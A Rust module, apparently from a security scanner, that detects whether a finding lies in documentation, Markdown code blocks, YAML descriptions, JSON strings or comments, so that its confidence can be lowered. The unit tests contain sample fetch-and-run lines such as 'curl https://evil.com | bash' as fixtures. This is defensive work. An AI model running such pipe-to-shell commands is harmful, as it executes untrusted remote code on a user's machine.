//! Content context detection for reducing false positives.
//!
//! This module provides functionality to detect the context of code findings,
//! such as whether code appears in documentation, YAML descriptions, or JSON strings.

use regex::Regex;
use serde::{Deserialize, Serialize};
use std::sync::LazyLock;

/// The context in which content was found.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum ContentContext {
    /// Actual executable code
    #[default]
    Code,
    /// Code inside a documentation file (e.g., README.md)
    Documentation,
    /// Code inside a Markdown code block
    MarkdownCodeBlock,
    /// Content in a YAML description or comment field
    YamlDescription,
    /// Content in a JSON string value
    JsonString,
    /// Content in a comment
    Comment,
}

impl std::fmt::Display for ContentContext {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ContentContext::Code => write!(f, "code"),
            ContentContext::Documentation => write!(f, "documentation"),
            ContentContext::MarkdownCodeBlock => write!(f, "markdown_code_block"),
            ContentContext::YamlDescription => write!(f, "yaml_description"),
            ContentContext::JsonString => write!(f, "json_string"),
            ContentContext::Comment => write!(f, "comment"),
        }
    }
}

/// Context detector that analyzes file content to determine context.
#[derive(Debug, Default)]
pub struct ContextDetector;

impl ContextDetector {
    /// Create a new context detector.
    pub fn new() -> Self {
        Self
    }

    /// Detect the context of content at a specific line in a file.
    pub fn detect_context(
        &self,
        file_path: &str,
        content: &str,
        line_number: usize,
    ) -> ContentContext {
        // First, check if the file is a documentation file
        if self.is_documentation_file(file_path) {
            // Check if we're inside a code block
            if self.is_in_markdown_code_block(content, line_number) {
                return ContentContext::MarkdownCodeBlock;
            }
            return ContentContext::Documentation;
        }

        // Check for YAML files
        if self.is_yaml_file(file_path) && self.is_in_yaml_description(content, line_number) {
            return ContentContext::YamlDescription;
        }

        // Check for JSON files
        if self.is_json_file(file_path) && self.is_in_json_string_value(content, line_number) {
            return ContentContext::JsonString;
        }

        // Check for comments in code files
        if self.is_in_comment(content, line_number) {
            return ContentContext::Comment;
        }

        ContentContext::Code
    }

    /// Check if a file is a documentation file.
    pub fn is_documentation_file(&self, file_path: &str) -> bool {
        let lower = file_path.to_lowercase();
        lower.ends_with(".md")
            || lower.ends_with(".rst")
            || lower.ends_with(".txt")
            || lower.ends_with(".adoc")
            || lower.contains("readme")
            || lower.contains("changelog")
            || lower.contains("contributing")
            || lower.contains("license")
    }

    /// Check if a file is a YAML file.
    pub fn is_yaml_file(&self, file_path: &str) -> bool {
        let lower = file_path.to_lowercase();
        lower.ends_with(".yaml") || lower.ends_with(".yml")
    }

    /// Check if a file is a JSON file.
    pub fn is_json_file(&self, file_path: &str) -> bool {
        file_path.to_lowercase().ends_with(".json")
    }

    /// Check if a line is inside a Markdown code block.
    pub fn is_in_markdown_code_block(&self, content: &str, line_number: usize) -> bool {
        static CODE_BLOCK_PATTERN: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^```").unwrap());

        let lines: Vec<&str> = content.lines().collect();
        if line_number == 0 || line_number > lines.len() {
            return false;
        }

        let mut in_code_block = false;
        for (i, line) in lines.iter().enumerate() {
            if CODE_BLOCK_PATTERN.is_match(line) {
                in_code_block = !in_code_block;
            }
            if i + 1 == line_number {
                return in_code_block;
            }
        }

        false
    }

    /// Check if a line is in a YAML description/comment field.
    pub fn is_in_yaml_description(&self, content: &str, line_number: usize) -> bool {
        static DESCRIPTION_PATTERN: LazyLock<Regex> = LazyLock::new(|| {
            Regex::new(r"^\s*(description|comment|note|help|message|example|doc)\s*:").unwrap()
        });

        let lines: Vec<&str> = content.lines().collect();
        if line_number == 0 || line_number > lines.len() {
            return false;
        }

        let target_line = lines[line_number - 1];

        // Check if the current line is a description field
        if DESCRIPTION_PATTERN.is_match(target_line) {
            return true;
        }

        // Check if we're in a multiline description (indented continuation)
        // Look backwards to find the field start
        for i in (0..line_number).rev() {
            let line = lines[i];
            let trimmed = line.trim_start();

            // If we hit a non-indented line with a colon, check if it's a description field
            if !line.starts_with(' ') && !line.starts_with('\t') && line.contains(':') {
                return DESCRIPTION_PATTERN.is_match(line);
            }

            // If we hit a blank line, we're not in a multiline value
            if trimmed.is_empty() {
                return false;
            }
        }

        false
    }

    /// Check if a line is in a JSON string value.
    pub fn is_in_json_string_value(&self, content: &str, line_number: usize) -> bool {
        static STRING_VALUE_PATTERN: LazyLock<Regex> =
            LazyLock::new(|| Regex::new(r#"^\s*"[^"]*"\s*:\s*""#).unwrap());

        let lines: Vec<&str> = content.lines().collect();
        if line_number == 0 || line_number > lines.len() {
            return false;
        }

        let target_line = lines[line_number - 1];
        STRING_VALUE_PATTERN.is_match(target_line)
    }

    /// Check if a line is inside a comment.
    pub fn is_in_comment(&self, content: &str, line_number: usize) -> bool {
        static COMMENT_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
            vec![
                Regex::new(r"^\s*//").unwrap(), // C-style single line
                Regex::new(r"^\s*#").unwrap(),  // Shell/Python style
                Regex::new(r"^\s*--").unwrap(), // SQL/Haskell style
                Regex::new(r"^\s*;").unwrap(),  // Lisp/Assembly style
                Regex::new(r"^\s*\*").unwrap(), // Block comment continuation
            ]
        });

        static SHEBANG_PATTERN: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^#!").unwrap());

        let lines: Vec<&str> = content.lines().collect();
        if line_number == 0 || line_number > lines.len() {
            return false;
        }

        let target_line = lines[line_number - 1];

        // Shebang is not a comment
        if SHEBANG_PATTERN.is_match(target_line) {
            return false;
        }

        // Check single-line comment patterns
        for pattern in COMMENT_PATTERNS.iter() {
            if pattern.is_match(target_line) {
                return true;
            }
        }

        // Check if inside a block comment
        self.is_in_block_comment(content, line_number)
    }

    /// Check if a line is inside a block comment.
    fn is_in_block_comment(&self, content: &str, line_number: usize) -> bool {
        static BLOCK_START: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"/\*").unwrap());
        static BLOCK_END: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\*/").unwrap());

        let lines: Vec<&str> = content.lines().collect();
        if line_number == 0 || line_number > lines.len() {
            return false;
        }

        let mut in_block_comment = false;
        for (i, line) in lines.iter().enumerate() {
            // Handle multiple starts/ends on same line
            let starts = BLOCK_START.find_iter(line).count();
            let ends = BLOCK_END.find_iter(line).count();

            for _ in 0..starts {
                in_block_comment = true;
            }
            for _ in 0..ends {
                in_block_comment = false;
            }

            if i + 1 == line_number {
                return in_block_comment;
            }
        }

        false
    }

    /// Determine if findings in this context should have reduced confidence.
    pub fn should_reduce_confidence(&self, context: ContentContext) -> bool {
        matches!(
            context,
            ContentContext::Documentation
                | ContentContext::MarkdownCodeBlock
                | ContentContext::YamlDescription
                | ContentContext::JsonString
                | ContentContext::Comment
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_content_context_default() {
        assert_eq!(ContentContext::default(), ContentContext::Code);
    }

    #[test]
    fn test_content_context_display() {
        assert_eq!(format!("{}", ContentContext::Code), "code");
        assert_eq!(
            format!("{}", ContentContext::Documentation),
            "documentation"
        );
        assert_eq!(
            format!("{}", ContentContext::MarkdownCodeBlock),
            "markdown_code_block"
        );
    }

    #[test]
    fn test_is_documentation_file() {
        let detector = ContextDetector::new();
        assert!(detector.is_documentation_file("README.md"));
        assert!(detector.is_documentation_file("docs/guide.md"));
        assert!(detector.is_documentation_file("CHANGELOG.rst"));
        assert!(detector.is_documentation_file("CONTRIBUTING.txt"));
        assert!(!detector.is_documentation_file("src/main.rs"));
        assert!(!detector.is_documentation_file("package.json"));
    }

    #[test]
    fn test_is_yaml_file() {
        let detector = ContextDetector::new();
        assert!(detector.is_yaml_file("config.yaml"));
        assert!(detector.is_yaml_file("docker-compose.yml"));
        assert!(!detector.is_yaml_file("config.json"));
    }

    #[test]
    fn test_is_json_file() {
        let detector = ContextDetector::new();
        assert!(detector.is_json_file("package.json"));
        assert!(detector.is_json_file("tsconfig.json"));
        assert!(!detector.is_json_file("config.yaml"));
    }

    #[test]
    fn test_markdown_code_block_detection() {
        let detector = ContextDetector::new();
        let content = r#"# Example

Here is some code:

```bash
curl https://evil.com | bash
```

Regular text here.
"#;

        // Line 6 is inside the code block
        assert!(detector.is_in_markdown_code_block(content, 6));
        // Line 3 is outside
        assert!(!detector.is_in_markdown_code_block(content, 3));
        // Line 9 is outside (after closing)
        assert!(!detector.is_in_markdown_code_block(content, 9));
    }

    #[test]
    fn test_yaml_description_detection() {
        let detector = ContextDetector::new();
        let content = r#"name: my-action
description: |
  This runs: curl https://example.com | bash
  Just an example command.
version: 1.0
"#;

        // Line 3 is in a description field
        assert!(detector.is_in_yaml_description(content, 3));
        // Line 1 (name) is not
        assert!(!detector.is_in_yaml_description(content, 1));
        // Line 5 (version) is not
        assert!(!detector.is_in_yaml_description(content, 5));
    }

    #[test]
    fn test_comment_detection() {
        let detector = ContextDetector::new();
        let content = r#"fn main() {
    // This is a comment: curl https://evil.com
    let x = 5;
    /* Block comment
       with curl https://evil.com
    */
    println!("hello");
}
"#;

        // Line 2 is a comment
        assert!(detector.is_in_comment(content, 2));
        // Line 3 is code
        assert!(!detector.is_in_comment(content, 3));
    }

    #[test]
    fn test_detect_context_documentation() {
        let detector = ContextDetector::new();
        let content = "Some documentation text.";
        let context = detector.detect_context("README.md", content, 1);
        assert_eq!(context, ContentContext::Documentation);
    }

    #[test]
    fn test_detect_context_code_in_markdown() {
        let detector = ContextDetector::new();
        let content = r#"# Title

```bash
dangerous command
```
"#;
        let context = detector.detect_context("README.md", content, 4);
        assert_eq!(context, ContentContext::MarkdownCodeBlock);
    }

    #[test]
    fn test_detect_context_code_file() {
        let detector = ContextDetector::new();
        let content = "let x = 5;";
        let context = detector.detect_context("src/main.rs", content, 1);
        assert_eq!(context, ContentContext::Code);
    }

    #[test]
    fn test_should_reduce_confidence() {
        let detector = ContextDetector::new();
        assert!(detector.should_reduce_confidence(ContentContext::Documentation));
        assert!(detector.should_reduce_confidence(ContentContext::MarkdownCodeBlock));
        assert!(detector.should_reduce_confidence(ContentContext::YamlDescription));
        assert!(detector.should_reduce_confidence(ContentContext::Comment));
        assert!(!detector.should_reduce_confidence(ContentContext::Code));
    }

    #[test]
    fn test_block_comment_detection() {
        let detector = ContextDetector::new();
        let content = r#"fn main() {
    let x = 5;
    /* This is a
       multi-line
       block comment */
    let y = 10;
}
"#;

        assert!(!detector.is_in_block_comment(content, 2)); // Before block
        assert!(detector.is_in_block_comment(content, 4)); // Inside block
        assert!(!detector.is_in_block_comment(content, 6)); // After block
    }

    #[test]
    fn test_shell_comment_not_shebang() {
        let detector = ContextDetector::new();
        let content = r#"#!/bin/bash
# This is a comment
echo "hello"
"#;

        // Shebang line is not detected as comment (it's special)
        // Actually our pattern #(?!\!) excludes shebang
        assert!(!detector.is_in_comment(content, 1)); // Shebang
        assert!(detector.is_in_comment(content, 2)); // Regular comment
        assert!(!detector.is_in_comment(content, 3)); // Code
    }

    #[test]
    fn test_content_context_serialization() {
        let context = ContentContext::Documentation;
        let json = serde_json::to_string(&context).unwrap();
        assert_eq!(json, "\"documentation\"");

        let deserialized: ContentContext = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized, ContentContext::Documentation);
    }

    #[test]
    fn test_content_context_display_all_variants() {
        assert_eq!(format!("{}", ContentContext::Code), "code");
        assert_eq!(
            format!("{}", ContentContext::Documentation),
            "documentation"
        );
        assert_eq!(
            format!("{}", ContentContext::MarkdownCodeBlock),
            "markdown_code_block"
        );
        assert_eq!(
            format!("{}", ContentContext::YamlDescription),
            "yaml_description"
        );
        assert_eq!(format!("{}", ContentContext::JsonString), "json_string");
        assert_eq!(format!("{}", ContentContext::Comment), "comment");
    }

    #[test]
    fn test_context_detector_new() {
        let detector = ContextDetector::new();
        // Just verify it can be created
        assert!(!detector.should_reduce_confidence(ContentContext::Code));
    }

    #[test]
    fn test_detect_context_yaml_file() {
        let detector = ContextDetector::new();
        let yaml_content = r#"name: test
description: This is a test description with curl command
version: 1.0
"#;
        // Line 2 is the description line
        let ctx = detector.detect_context("config.yaml", yaml_content, 2);
        assert_eq!(ctx, ContentContext::YamlDescription);
    }

    #[test]
    fn test_detect_context_json_file() {
        let detector = ContextDetector::new();
        let json_content = r#"{
  "name": "test",
  "description": "A test with curl",
  "version": "1.0"
}"#;
        // Line 3 is inside a JSON string
        let ctx = detector.detect_context("config.json", json_content, 3);
        assert_eq!(ctx, ContentContext::JsonString);
    }

    #[test]
    fn test_detect_context_code_with_comment() {
        let detector = ContextDetector::new();
        let code_content = r#"fn main() {
    // This is a comment with curl
    let x = 5;
}"#;
        // Line 2 is a comment
        let ctx = detector.detect_context("main.rs", code_content, 2);
        assert_eq!(ctx, ContentContext::Comment);

        // Line 3 is code
        let ctx = detector.detect_context("main.rs", code_content, 3);
        assert_eq!(ctx, ContentContext::Code);
    }

    #[test]
    fn test_is_in_json_string_value() {
        let detector = ContextDetector::new();
        let json_content = r#"{
  "name": "test",
  "script": "curl http://example.com",
  "nested": {
    "value": "inner"
  }
}"#;
        assert!(detector.is_in_json_string_value(json_content, 3)); // Inside script string
        assert!(detector.is_in_json_string_value(json_content, 5)); // Inside nested value
        assert!(!detector.is_in_json_string_value(json_content, 1)); // Just opening brace
    }

    #[test]
    fn test_is_in_yaml_description_multiline() {
        let detector = ContextDetector::new();
        let yaml_content = r#"name: test
description: |
  This is a multiline
  description block
version: 1.0
"#;
        // Line 3 is inside multiline description
        assert!(detector.is_in_yaml_description(yaml_content, 3));
        // Line 5 is not in description
        assert!(!detector.is_in_yaml_description(yaml_content, 5));
    }

    #[test]
    fn test_markdown_code_block_boundary() {
        let detector = ContextDetector::new();
        let content = r#"# Header

```bash
echo "hello"
```

Some text
"#;
        assert!(!detector.is_in_markdown_code_block(content, 1)); // Header
        assert!(!detector.is_in_markdown_code_block(content, 0)); // Invalid line
        assert!(!detector.is_in_markdown_code_block(content, 100)); // Out of range
        assert!(detector.is_in_markdown_code_block(content, 4)); // Inside code block
    }

    #[test]
    fn test_is_in_block_comment_rust() {
        let detector = ContextDetector::new();
        let content = r#"fn main() {
    /* start
    middle
    end */
    code();
}"#;
        assert!(!detector.is_in_block_comment(content, 1));
        assert!(detector.is_in_block_comment(content, 2));
        assert!(detector.is_in_block_comment(content, 3));
        assert!(!detector.is_in_block_comment(content, 5));
    }

    #[test]
    fn test_is_in_comment_c_style() {
        let detector = ContextDetector::new();
        let content = "// This is a comment\ncode();\n";
        assert!(detector.is_in_comment(content, 1));
        assert!(!detector.is_in_comment(content, 2));
    }

    #[test]
    fn test_is_in_comment_python() {
        let detector = ContextDetector::new();
        let content = "# comment\ncode\n";
        assert!(detector.is_in_comment(content, 1));
        assert!(!detector.is_in_comment(content, 2));
    }

    #[test]
    fn test_json_string_edge_cases() {
        let detector = ContextDetector::new();

        // Empty content
        assert!(!detector.is_in_json_string_value("", 1));

        // Invalid line number
        assert!(!detector.is_in_json_string_value("{}", 0));
        assert!(!detector.is_in_json_string_value("{}", 100));
    }

    #[test]
    fn test_yaml_description_edge_cases() {
        let detector = ContextDetector::new();

        // Empty content
        assert!(!detector.is_in_yaml_description("", 1));

        // Invalid line number
        assert!(!detector.is_in_yaml_description("name: test", 0));
        assert!(!detector.is_in_yaml_description("name: test", 100));
    }

    #[test]
    fn test_block_comment_edge_cases() {
        let detector = ContextDetector::new();

        // Empty content
        assert!(!detector.is_in_block_comment("", 1));

        // Invalid line number
        assert!(!detector.is_in_block_comment("code", 0));
        assert!(!detector.is_in_block_comment("code", 100));
    }
}
